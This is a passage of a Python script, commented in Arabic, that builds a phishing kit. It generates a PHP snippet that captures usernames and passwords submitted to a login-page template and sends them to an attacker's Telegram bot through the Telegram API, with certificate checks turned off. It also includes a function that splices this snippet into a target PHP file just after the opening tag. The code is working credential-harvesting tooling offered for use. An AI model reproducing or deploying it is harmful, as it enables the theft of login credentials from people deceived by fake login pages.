def check_command_exists(command_name):
    """
    التحقق مما إذا كان أمر معين (مثل git, php) مثبتًا في النظام.
    Returns True if the command exists, False otherwise.
    """
    try:
        # تشغيل الأمر مع خيار --version للتحقق من وجوده
        subprocess.run([command_name, '--version'], check=True, capture_output=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        # إذا فشل الأمر أو لم يتم العثور عليه
        return False

def generate_telegram_php_code(chat_id, bot_token, template_name):
    """
    ينشئ جزء كود PHP لدمج تليجرام مع البيانات المرسلة.
    Generates the PHP code snippet for Telegram integration.
    """
    return f"""
<?php
// --- بداية دمج التليجرام بواسطة السكريبت ---
// يرجى ملاحظة: تم إضافة هذا الكود تلقائياً لربط البيانات ببوت تليجرام.

$botToken = '{bot_token}';
$chatId = '{chat_id}';

if ($_SERVER["REQUEST_METHOD"] == "POST") {{
    // استخراج اسم المستخدم وكلمة المرور من البيانات المرسلة
    // قد تختلف أسماء الحقول حسب القالب (غالباً 'username' و 'password')
    $username = isset($_POST['username']) ? htmlspecialchars($_POST['username']) : 'غير متاح';
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'غير متاح';

    // صياغة الرسالة التي سيتم إرسالها إلى التليجرام
    $message = "🚨 تم تلقي بيانات دخول جديدة من قالب {template_name}! 🚨\\n";
    $message .= "🔑 اسم المستخدم: <b>" . $username . "</b>\\n";
    $message .= "🔒 كلمة المرور: <b>" . $password . "</b>\\n";

    // عنوان URL لواجهة برمجة تطبيقات التليجرام
    $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

    // إعداد البيانات لإرسالها
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML' // استخدام HTML لتنسيق الرسالة
    ];

    // تهيئة طلب cURL (يفضل استخدام cURL)
    if (function_exists('curl_init')) {{
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }} else {{
        // بديل: استخدام file_get_contents إذا لم يكن cURL متاحاً
        $options = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query($data),
            ],
        ];
        $context = stream_context_create($options);
        @file_get_contents($telegramApiUrl, false, $context);
    }}
}}
// --- نهاية دمج التليجرام ---
?>
"""

def modify_php_file(file_path, telegram_php_code_snippet):
    """
    يعدل ملف PHP لإضافة كود تليجرام.
    Inserts the Telegram PHP code snippet into the target PHP file.
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()

        # نقطة الإدخال: بعد علامة <?php مباشرة
        # نبحث عن <?php ونضيف الكود بعدها.
        # إذا لم نجدها، نضع الكود في بداية الملف (وهو أمر غير مرجح لملف PHP)
        if content.strip().startswith("<?php"):
            # تقسيم المحتوى بعد أول ظهور لـ <?php
            parts = content.split("<?php", 1)
            # إعادة بناء المحتوى بإضافة الكود
            new_content = parts[0] + "<?php\n" + telegram_php_code_snippet + "\n" + parts[1]
        else:
            # إذا لم تكن العلامة موجودة، نضع الكود في البداية
            print("تحذير: لم يتم العثور على علامة '<?php' في بداية الملف. سيتم إضافة الكود في البداية.")
            new_content = telegram_php_code_snippet + "\n" + content

        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(new_content)
        print(f"تم تعديل الملف '{file_path}' بنجاح.")
    except Exception as e:
        print(f"خطأ أثناء تعديل ملف PHP: {e}")
        sys.exit(1)
